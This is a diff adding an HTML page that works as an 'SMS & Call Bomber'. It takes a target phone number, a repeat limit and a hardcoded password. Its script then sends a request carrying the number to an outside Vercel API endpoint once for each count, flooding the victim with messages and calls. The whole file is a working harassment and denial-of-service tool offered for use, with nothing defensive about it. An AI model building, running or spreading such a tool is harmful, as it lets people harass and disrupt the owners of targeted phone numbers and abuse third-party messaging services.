@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Alin Chakma Sms & Call Bomber ☠️</title>
+  <style>
+    body {
+      animation: colorchange 10s infinite;
+      font-family: 'Segoe UI', sans-serif;
+      padding: 40px;
+      max-width: 450px;
+      margin: auto;
+      border-radius: 15px;
+      background: #fff;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+    }
+
+    @keyframes colorchange {
+      0%   { background: linear-gradient(45deg, #e3f2fd, #fbecec); }
+      25%  { background: linear-gradient(45deg, #fbecec, #fff3e0); }
+      50%  { background: linear-gradient(45deg, #f3e5f5, #e0f7fa); }
+      75%  { background: linear-gradient(45deg, #e8f5e9, #fce4ec); }
+      100% { background: linear-gradient(45deg, #e3f2fd, #fbecec); }
+    }
+
+    h1 {
+      color: #6a1b9a;
+      text-align: center;
+      font-size: 26px;
+      margin-bottom: 30px;
+    }
+
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 20px;
+      margin-bottom: 6px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 2px solid #90caf9;
+      box-sizing: border-box;
+    }
+
+    button {
+      margin-top: 30px;
+      background-color: #43a047;
+      color: white;
+      padding: 15px;
+      width: 100%;
+      font-size: 18px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #2e7d32;
+    }
+
+    #response {
+      margin-top: 25px;
+      font-weight: bold;
+      text-align: left;
+      color: #d32f2f;
+      background-color: #fff3f3;
+      padding: 15px;
+      border-radius: 8px;
+      border: 1px solid #ffcdd2;
+      min-height: 40px;
+      white-space: pre-line;
+    }
+  </style>
+</head>
+<body>
+  <h1>Alin Chakma Sms & Call Bomber ☠️</h1>
+
+  <label>📱 Target Number:</label>
+  <input type="text" id="number" placeholder="target number" />
+
+  <label>🧨 Limit:</label>
+  <input type="number" id="limit" placeholder="100" min="1" />
+
+  <label>🔐 Password:</label>
+  <input type="password" id="password" placeholder="Enter password" />
+
+  <button onclick="sendBomb()">🚀 Start Bombing</button>
+
+  <div id="response"></div>
+
+  <script>
+    function sendBomb() {
+      const number = document.getElementById("number").value;
+      const limit = parseInt(document.getElementById("limit").value);
+      const password = document.getElementById("password").value;
+      const responseDiv = document.getElementById("response");
+      responseDiv.innerText = "";
+
+      if (password !== "Alin Chakma") {
+        alert("❌ Incorrect Password!");
+        return;
+      }
+
+      if (!number || isNaN(limit) || limit < 1) {
+        alert("❗ Please enter a valid number and limit.");
+        return;
+      }
+
+      for (let i = 1; i <= limit; i++) {
+        fetch(`https://dzsmscall-abu-rashids-projects.vercel.app/api/test?phone=${number}`)
+          .then(res => res.text())
+          .then(data => {
+            responseDiv.innerText += `✅ Bomb ${i}: ${data}
+`;
+          })
+          .catch(err => {
+            responseDiv.innerText += `❌ Bomb ${i}: Failed - ${err}
+`;
+          });
+      }
+    }
+  </script>
+</body>
+</html>
